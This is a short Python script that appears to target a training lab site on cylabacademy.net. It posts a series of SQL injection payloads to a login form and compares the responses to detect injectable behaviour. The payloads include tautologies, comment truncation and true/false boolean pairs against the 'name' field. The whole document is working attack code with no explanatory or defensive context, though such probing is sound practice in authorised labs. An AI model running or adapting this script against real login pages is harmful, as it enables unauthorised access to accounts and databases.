import sys, requests, urllib3, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://xebec.cylabacademy.net:36284/"
tests = ["admin''", "admin' AND '1'='1", "admin' AND '1'='2", "admin' OR 'a'='a",
         "admin' OR 1=1 OR '", "admin'||'x", "admin' AND 1=1 AND 'a'='a",
         "admin' AND 1=2 AND 'a'='a", "admin'--", "admin'-- -", "admin' ; --"]
for name in tests:
    try:
        r = requests.post(BASE, data={"name": name, "pass": "x"}, timeout=20)
        al = re.findall(r"<!-- <strong>Title</strong> -->\s*([^<]{0,120})", r.text)
        print("%-28s -> %d | %r" % (name[:28], len(r.text), (al[0].strip()[:60] if al else "-")))
    except Exception as e:
        print(name, "ERR", type(e).__name__)
